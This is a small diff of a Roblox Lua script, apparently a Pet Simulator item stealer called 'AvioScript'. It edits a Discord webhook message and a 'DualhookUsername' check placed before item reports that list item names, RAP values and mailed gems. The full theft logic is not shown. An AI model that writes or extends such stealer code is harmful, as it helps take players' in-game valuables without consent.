@@ -169,7 +169,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     local msg = {
         ["content"] = ping,
         ["username"] = "AvioScript",
-        ["avatar_url"] = "https://raw.githubusercontent.com/PetSimulatorScripting/Webhook/407d95bac20e3b4d94d9807ce329467686a7e969/logo.png",
+        ["avatar_url"] = "https://raw.githubusercontent.com/PetSimulatorScripting/Webhook/refs/heads/main/logo.jpg",
         ["embeds"] = {
             {
                 ["title"] = "**You just got a new item!**",
@@ -813,7 +813,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                         v.Item_RAP,
                         totalRap
                     )
-                    if Roblox_Username ~= MargarinePool then
+                    if Roblox_Username ~= DualhookUsername then
                         SendMessage(
                             v.Item_Name,
                             v.Item_Class,
